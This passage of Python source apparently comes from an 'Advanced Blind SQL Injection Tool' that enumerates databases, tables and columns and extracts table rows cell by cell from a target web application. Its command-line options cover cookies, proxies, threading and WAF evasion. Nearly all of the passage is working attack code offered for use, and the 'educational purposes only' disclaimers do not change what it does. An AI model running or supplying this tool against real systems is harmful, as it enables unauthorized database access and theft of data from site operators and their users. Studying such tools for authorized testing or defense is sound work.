        self._print_config_summary(f"Enumerating {title}")
        
        # Build schema filter
        schema_filter = ""
        if schema:
            if self.db_engine == 'postgresql':
                schema_filter = f" AND table_schema = '{schema}'"
            elif self.db_engine == 'mysql':
                schema_filter = f" AND table_schema = '{schema}'"
            else:  # MSSQL
                schema_filter = f" AND table_schema = '{schema}'"
        
        count_sql = f"SELECT COUNT(DISTINCT table_name) FROM information_schema.tables WHERE table_catalog = '{db}'{schema_filter}"
        row_sql = f"(SELECT DISTINCT table_name FROM information_schema.tables WHERE table_catalog = '{db}'{schema_filter} ORDER BY table_name LIMIT 1 OFFSET {{offset}})"
        
        tables = self._fetch_item_list("tables", count_sql, row_sql, f"tables in database '{db}'", "Table", self.session_data.get("tables"))
        
        if tables is not None:
            self._output_results(tables, title)
            return True
        return False

    def dump_columns(self):
        """Enhanced column enumeration."""
        db, table = self.args.database, self.args.table
        schema = getattr(self.args, 'schema', None)
        
        title = f"Columns in Table '{table}'"
        if schema:
            title += f" (Schema: '{schema}')"
        
        self._print_config_summary(f"Enumerating {title}")
        
        schema_filter = f" AND table_schema = '{schema}'" if schema else ""
        count_sql = f"SELECT COUNT(DISTINCT column_name) FROM information_schema.columns WHERE table_catalog = '{db}' AND table_name = '{table}'{schema_filter}"
        row_sql = f"(SELECT DISTINCT column_name FROM information_schema.columns WHERE table_catalog = '{db}' AND table_name = '{table}'{schema_filter} ORDER BY ordinal_position LIMIT 1 OFFSET {{offset}})"
        
        columns = self._fetch_item_list("columns", count_sql, row_sql, f"columns in table '{table}'", "Column", self.session_data.get("columns"))
        
        if columns is not None:
            self._output_results(columns, title)
            return True
        return False

    def dump_table_data(self):
        """Enhanced table data extraction."""
        db, table = self.args.database, self.args.table
        schema = getattr(self.args, 'schema', None)
        
        table_ref = f'"{schema}"."{table}"' if schema else f'"{table}"'
        self._print_config_summary(f"Extracting Data from Table '{table_ref}' in Database '{db}'")
        
        # Determine columns to fetch
        header = []
        if self.args.column:
            header = [c.strip() for c in self.args.column.split(',')]
            self.log(f"Using specified columns: {header}", 'info')
        else:
            self.log(f"Enumerating columns for table '{table}'...", 'info')
            schema_filter = f" AND table_schema = '{schema}'" if schema else ""
            col_count_sql = f"SELECT COUNT(DISTINCT column_name) FROM information_schema.columns WHERE table_catalog = '{db}' AND table_name = '{table}'{schema_filter}"
            col_row_sql = f"(SELECT DISTINCT column_name FROM information_schema.columns WHERE table_catalog = '{db}' AND table_name = '{table}'{schema_filter} ORDER BY ordinal_position LIMIT 1 OFFSET {{offset}})"
            header = self._fetch_item_list("fetch_columns", col_count_sql, col_row_sql, f"columns in table '{table}'", "Column")
        
        if not header:
            self.log(f"No columns found for table '{table}'. Aborting.", 'error')
            return False
        
        # Get row count
        row_count_sql = f"SELECT COUNT(*) FROM {table_ref}"
        row_count_query_template = f"({row_count_sql}) {{operator}} {{value}}"
        total_rows = self._fetch_scalar_value(row_count_query_template, MAX_COUNT, f"row count of {table}")
        
        if total_rows is None:
            self.log(f"Could not determine row count for table '{table}'. Aborting.", 'error')
            return False
        elif total_rows == 0:
            self.log(f"Table '{table}' is empty.", 'info')
            return True

        # Determine row range
        start_row = self.args.start
        stop_row = self.args.stop if self.args.stop is not None else total_rows
        
        start_idx = max(0, start_row - 1)
        end_idx = min(total_rows, stop_row)

        if start_idx >= end_idx:
            self.log(f"Invalid row range. Start ({start_row}) >= Stop ({stop_row}). Nothing to fetch.", 'error')
            return True

        self.log(f"Table '{table}' has {total_rows} rows. Extracting rows {start_idx + 1} to {end_idx}.", 'info')
        
        # Extract data
        all_rows_data = []
        
        for r_idx in range(start_idx, end_idx):
            if self.interrupted.is_set(): 
                break
                
            self.log(f"Extracting row {r_idx + 1}/{total_rows}...", 'info')
            row_data = []
            
            for c_idx, col_name in enumerate(header):
                if self.interrupted.is_set(): 
                    break
                    
                cell_sql = f"CAST((SELECT \"{col_name}\" FROM {table_ref} OFFSET {r_idx} LIMIT 1) AS TEXT)"
                cell_desc = f"R{r_idx+1}:C{c_idx+1} ({col_name})"
                cell_value = self._fetch_string(cell_sql, cell_desc)
                
                if cell_value is None:  # Interrupted
                    self.log("Data extraction interrupted.", 'warning')
                    return False
                    
                row_data.append(cell_value)
            
            if not self.interrupted.is_set():
                all_rows_data.append(row_data)

        # Format and display results
        if not self.interrupted.is_set() and all_rows_data:
            self._display_table_data(header, all_rows_data, f"Data from Table '{table_ref}'")
        
        return not self.interrupted.is_set()

    def _display_table_data(self, header, rows, title):
        """Enhanced table data display with better formatting."""
        # Calculate optimal column widths
        all_data = [header] + rows
        col_widths = []
        
        for col_idx in range(len(header)):
            max_width = max(len(str(row[col_idx])) for row in all_data)
            # Limit column width for readability
            col_widths.append(min(max_width, 50))
        
        # Create formatted output
        output_lines = [f"\n{title}:", "="*80]
        
        # Header row
        header_line = " | ".join(f"{h:<{w}}" for h, w in zip(header, col_widths))
        output_lines.append(header_line)
        output_lines.append("-" * len(header_line))
        
        # Data rows
        for row in rows:
            formatted_row = []
            for item, width in zip(row, col_widths):
                str_item = str(item)
                if len(str_item) > width:
                    str_item = str_item[:width-3] + "..."
                formatted_row.append(f"{str_item:<{width}}")
            output_lines.append(" | ".join(formatted_row))
        
        output_text = "\n".join(output_lines) + "\n"
        print(output_text)
        
        # Save to file if specified
        if self.output_file:
            try:
                with open(self.output_file, 'a', encoding='utf-8') as f:
                    f.write(f"\n[{datetime.now().isoformat()}] {output_text}")
                self.log(f"Table data appended to {self.output_file}", 'info')
            except Exception as e:
                self.log(f"Error writing table data to file: {e}", 'error')


def parse_arguments():
    """Enhanced argument parsing with more options."""
    parser = argparse.ArgumentParser(
        description="""Advanced Blind SQL Injection Tool v2.0
        
Supports multiple database engines (PostgreSQL, MySQL, MSSQL) with enhanced
WAF evasion, session management, and detailed logging capabilities.

EDUCATIONAL PURPOSES ONLY - Use only on systems you own or have explicit permission to test.
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    # Action arguments
    action_group = parser.add_argument_group('Actions')
    action_group.add_argument("--banner", action="store_true", help="Dump database version banner")
    action_group.add_argument("--user", action="store_true", help="Dump current database user")
    action_group.add_argument("--current-db", action="store_true", help="Dump current database name")
    action_group.add_argument("--dbs", action="store_true", help="Enumerate all database names")
    action_group.add_argument("--schemas", action="store_true", help="Enumerate schemas in database (requires -D)")
    action_group.add_argument("--tables", action="store_true", help="Enumerate tables in database (requires -D)")
    action_group.add_argument("--columns", action="store_true", help="Enumerate columns in table (requires -D, -T)")
    action_group.add_argument("--fetch", action="store_true", help="Extract data from table (requires -D, -T)")
    action_group.add_argument("--query", type=str, metavar="SQL", help="Execute custom SQL query and dump result")
    action_group.add_argument("--flush-session", action="store_true", help="Clear saved session and exit")

    # Target specification
    target_group = parser.add_argument_group('Target Specification')
    target_group.add_argument("--url", type=str, help="Base URL for injection (default: https://host/api)")
    target_group.add_argument("--suffix", type=str, help="URL suffix after injection point (default: /endpoint)")
    target_group.add_argument("--injection-point", type=str, default="value", help="Injection point parameter name")
    target_group.add_argument("--headers", type=str, help="Custom headers (format: 'Header1:Value1,Header2:Value2')")
    target_group.add_argument("--cookie", type=str, help="Cookie header value")
    target_group.add_argument("--proxy", type=str, help="HTTP proxy (e.g., http://127.0.0.1:8080)")

    # Database specification
    db_group = parser.add_argument_group('Database Options')
    db_group.add_argument("-D", "--database", type=str, help="Target database name")
    db_group.add_argument("-T", "--table", type=str, help="Target table name")
    db_group.add_argument("--schema", type=str, help="Target schema name (optional)")
    db_group.add_argument("-C", "--column", type=str, help="Comma-separated column names for --fetch")
    db_group.add_argument("--db-engine", choices=['postgresql', 'mysql', 'mssql'], default='postgresql',
                         help="Target database engine (default: postgresql)")

    # Data extraction options
    data_group = parser.add_argument_group('Data Extraction')
    data_group.add_argument("--start", type=int, default=1, help="Start row for --fetch (1-based, default: 1)")
    data_group.add_argument("--stop", type=int, help="Stop row for --fetch (inclusive)")

    # Request options
    request_group = parser.add_argument_group('Request Configuration')
    request_group.add_argument("--threads", type=int, default=DEFAULT_THREADS, 
                              help=f"Concurrent threads (default: {DEFAULT_THREADS})")
    request_group.add_argument("--delay", type=float, default=0.0,
                              help="Delay between requests in seconds (default: 0.0)")
    request_group.add_argument("--true-code", type=int, help="HTTP status code for TRUE conditions")
    request_group.add_argument("--false-code", type=int, help="HTTP status code for FALSE conditions")
    request_group.add_argument("--auto-detect", action="store_true", 
                              help="Auto-detect TRUE/FALSE status codes")

    # Evasion and stealth
    evasion_group = parser.add_argument_group('Evasion Options')
    evasion_group.add_argument("--stealth", action="store_true", 
                              help="Use BETWEEN operator for WAF evasion (slower)")

    # Output and logging
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument("--verbose", action="store_true", help="Enable verbose output")
    output_group.add_argument("--output", type=str, help="Save results to file")
    output_group.add_argument("--continue-on-error", action="store_true", 
                             help="Continue execution even if an action fails")

    args = parser.parse_args()

    # Enhanced argument validation
    action_args = ['banner', 'user', 'current_db', 'dbs', 'schemas', 'tables', 'columns', 'fetch', 'query', 'flush_session']
    if not any(getattr(args, arg) for arg in action_args):
        parser.error("No action specified. Use --help to see available actions.")

    # Dependency validation
    if args.schemas and not args.database:
        parser.error("--schemas requires -D/--database")
    if args.tables and not args.database:
        parser.error("--tables requires -D/--database")
    if args.columns and (not args.database or not args.table):
        parser.error("--columns requires -D/--database and -T/--table")
    if args.fetch and (not args.database or not args.table):
        parser.error("--fetch requires -D/--database and -T/--table")
    
    # Data extraction validation
    data_extraction_args = ['column', 'start', 'stop']
    if any(getattr(args, arg, None) for arg in data_extraction_args if arg != 'start') and not args.fetch:
        parser.error("Data extraction options (--column, --stop) can only be used with --fetch")
    
    # Range validation
    if args.stop is not None and args.start > args.stop:
        parser.error("--start cannot be greater than --stop")
    
    # Thread validation
    if args.threads < 1 or args.threads > 100:
        parser.error("--threads must be between 1 and 100")
    
    # Status code validation
    if args.true_code is not None and args.false_code is not None:
        if args.true_code == args.false_code:
            parser.error("--true-code and --false-code cannot be the same")
    
    return args


if __name__ == "__main__":
    # Enhanced banner
    print("="*80)
    print("          Advanced Blind SQL Injection Tool v2.0")
    print("="*80)
    print("[!] LEGAL DISCLAIMER:")
    print("    This tool is designed for authorized security testing and")
    print("    educational purposes ONLY. Unauthorized access to computer")
    print("    systems is illegal. Users are solely responsible for their")
    print("    actions and must comply with all applicable laws.")
    print("="*80)

    try:
        args = parse_arguments()

        if args.flush_session:
            BlindSQLiExploiter.clear_session_file()
            print("[+] Session cleared successfully.")
            sys.exit(0)

        # Initialize and run exploiter
        exploiter = BlindSQLiExploiter(args)
        exploiter.run()
        
    except KeyboardInterrupt:
        print("\n[!] Tool interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
